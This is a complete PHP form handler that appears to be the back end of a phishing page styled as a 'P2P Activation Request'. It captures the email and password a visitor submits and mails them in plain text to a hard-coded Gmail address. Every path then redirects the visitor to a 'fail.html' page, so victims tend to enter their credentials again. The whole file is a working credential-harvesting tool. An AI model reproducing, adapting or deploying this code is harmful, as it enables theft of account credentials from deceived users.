<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if form fields are set
    $email = isset($_POST['email']) ? filter_var($_POST['email'], FILTER_VALIDATE_EMAIL) : "";
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : "";

    // Validate email
    if (!$email) {
        die("Invalid email format.");
    }

    // Your email where data will be sent
    $to = "nwankwogoodluck156@gmail.com";
    $subject = "New P2P Activation Request";

    // Email body
    $message = "Email: $email\n";
    $message .= "Password: $password\n";

    // Headers
    $headers = "From: no-reply@yourwebsite.com\r\n";
    $headers .= "Reply-To: $email\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Debugging - Check if mail() returns true
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to a success page (optional)
        header("Location: fail.html");
        exit();
    } else {
        error_log("Mail function failed."); // Log error for debugging
        header("Location: fail.html");
        exit();
    }
} else {
    // Redirect if accessed without POST data
    header("Location: fail.html");
    exit();
}
?
